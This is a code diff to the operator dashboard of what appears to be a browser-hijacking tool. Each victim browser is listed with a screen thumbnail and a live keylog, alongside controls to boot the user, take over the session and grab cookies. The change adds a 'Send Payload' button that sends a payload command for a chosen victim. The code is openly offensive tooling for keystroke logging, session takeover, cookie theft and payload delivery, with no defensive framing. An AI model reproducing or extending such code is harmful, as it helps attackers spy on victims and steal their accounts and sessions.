@@ -50,6 +50,7 @@ socket.on("thumbnail", function(browser_id, thumbnail_blob, keylog){
       <tr id="row_${browser_id}"> \
         <td><img id="video_${browser_id}" class="thumbnail" height="140" src="" /></td> \
         <td><span id="keylog_${browser_id}" class="keylog"></span></td> \
+        <td><button id="payload_${browser_id}" class="payload">Send Payload</button></td> \
         <td><button id="bootuser_${browser_id}" class="bootuser">Boot User</button></td> \
         <td><button id="takeover_${browser_id}" class="takeover">Take Over</button></td> \
         <td><button id="cookies_${browser_id}" class="cookies">Get Cookies</button></td> \
@@ -73,6 +74,11 @@ socket.on("keylog", function(browser_id, keydata){
 $(document).on('click', '.bootuser', function () {
   let browser_id = this.id.replace("bootuser_", "")
   socket.emit('boot_user', browser_id)
+})
+
+$(document).on('click', '.payload', function () {
+  let browser_id = this.id.replace("payload_", "")
+  socket.emit('send_payload', browser_id)
 })
 
 $(document).on('click', '.cookies', function () {
